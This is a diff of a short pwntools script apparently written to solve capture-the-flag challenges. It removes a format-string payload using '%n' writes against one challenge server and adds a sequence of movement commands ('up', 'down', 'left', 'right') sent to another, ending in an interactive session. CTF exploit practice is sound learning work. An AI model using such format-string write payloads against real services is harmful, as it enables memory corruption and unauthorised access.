@@ -1,13 +1,18 @@
 from pwn import *
-context.log_level       = "DEBUG"
-context.arch            = "amd64"
+
 #p = process("./chall_patched")
-p = remote("47.254.251.2", 4098)
+p = remote("0.cloud.chals.io", 22980)
 
-payload =b"%*8$c%*9$c" + b"%11$n"
-p.sendlineafter(b"your name:",payload)
-p.sendlineafter (b"gift:",b"\x00")
 
+p.sendline(b"up")
+p.sendline(b"up")
+p.sendline(b"down")
+p.sendline(b"down")
+p.sendline(b"left")
+p.sendline(b"right")
+p.sendline(b"left")
+p.sendline(b"right")
+p.recvuntil(b"Should we go left, right, up, or down?")
 p.interactive()
 
 #11
